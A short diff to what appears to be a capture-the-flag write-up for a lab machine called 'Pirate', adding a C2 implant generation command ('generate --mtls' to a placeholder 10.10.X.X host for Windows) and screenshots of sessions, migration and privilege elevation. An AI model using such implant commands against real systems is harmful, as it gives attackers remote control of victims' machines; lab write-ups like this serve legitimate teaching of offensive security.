@@ -498,6 +498,17 @@ type C:\Users\Administrator\Desktop\root.txt
 
 [Evidence](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pirate/Loot_20260302_0735.zip "Results")
 
+```
+generate --mtls 10.10.X.X --os windows --arch amd64 --save /z0n/z0n/posts/Pirate
+```
+
+![Pirate](htb_Pirate_sesions.png)
+
+![Pirate](htb_Pirate_migrate.png)
+
+![Pirate](htb_Pirate_elev.png)
+
+
 # Defensive Operations
 
 ### Startegic Overview
